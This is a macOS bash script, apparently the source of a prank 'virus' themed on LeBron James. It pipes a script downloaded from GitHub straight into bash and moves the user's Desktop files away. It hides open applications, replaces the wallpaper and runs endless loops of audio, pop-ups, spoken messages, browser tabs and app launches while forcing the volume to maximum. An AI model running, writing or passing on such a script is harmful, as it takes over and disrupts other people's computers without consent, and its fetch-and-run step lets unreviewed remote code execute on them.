#!/usr/bin/env bash
curl "https://a.espncdn.com/combiner/i?img=/i/headshots/nba/players/full/1966.png" > ~/lebron.png
curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/fire.mp3" > ~/fire.mp3
curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/lebron.mp3" > ~/lebron.mp3
curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/lebronapp.sh" | bash

mkdir ~/Desktop_backup
mv ~/Desktop/* ~/Desktop_backup

osascript -e '
tell application "Finder"
        activate
        set visible of every process whose visible is true and name is not "Finder" to false
end tell
'

osascript -e '
tell application "System Events"
    tell every desktop
        set picture to "~/lebron.png"
    end tell
end tell
'

lebronCount=1

while true
do
        for i in {1..5}; do
                afplay ~/lebron.mp3
        done
        afplay ~/fire.mp3
done&

copylebron() {
        cp ~/lebron.png "$HOME/Desktop/lebron$lebronCount.png"
        ((lebronCount++))
}

linklebron() {
        open "https://a.espncdn.com/combiner/i?img=/i/headshots/nba/players/full/1966.png"
}

notiflebron() {
        osascript -e 'display notification "Lebron James is the GOAT" with title "Lebron"'
}

saylebron() {
        randvoice=$(say -v '?' | awk '{print $1}' | sort -u | shuf -n 1)
        randrate=$(( (RANDOM % 450) + 50 ))
        say -v $randvoice -r $randrate "Lebron James is the goat."&
}

openpiclebron() {
        open -n lebron.png
}

warnlebron() {
        osascript -e 'tell app "System Events" to display dialog "Warning: Lebron James career too dominant" buttons {"OK"} default button "OK" with icon caution'&
}

docklebron() {
        open -n ~/lebronapp.app
}

menubarlebron() {
        count=$(ps -eo command | grep -i "lebronappcopy" | wc -l | tr -d ' ')
        if [ "$count" -le 10 ]; then
                open -n ~/lebronappcopy.app
        fi
}

all_funcs=("copylebron" "linklebron" "notiflebron" "saylebron" "openpiclebron" "warnlebron" "docklebron" "menubarlebron")

while true
do
        random_index=$(( RANDOM % ${#all_funcs[@]} ))
        ${all_funcs[$random_index]}
        sleep 0.1s
        osascript -e "set volume output volume 100"
done
